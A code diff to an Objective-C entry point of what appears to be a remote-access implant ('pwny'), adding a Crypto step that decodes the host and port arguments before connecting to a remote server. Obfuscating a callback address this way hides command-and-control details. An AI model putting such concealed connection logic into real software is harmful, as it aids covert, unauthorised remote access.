@@ -22,6 +22,8 @@
 * SOFTWARE.
 */
 
+#import "crypto.h"
+
 #import "pwny.h"
 #import "console.h"
 #import "utils.h"
@@ -38,7 +40,13 @@ int main(int argc, const char *argv[]) {
                 NSString *str = [[NSString alloc] initWithCString:argv[i] encoding:NSUTF8StringEncoding];
                 [args addObject:str];
             }
-            connectToServer(args[1], [args[2] integerValue]);
+            
+            Crypto *crypto = [[Crypto alloc] init];
+
+            NSString *remoteHost = [crypto crypto:args[1]];
+            int remotePort = [[crypto crypto:args[2]] integerValue];
+
+            connectToServer(remoteHost, remotePort);
         }
     }
     return 0;
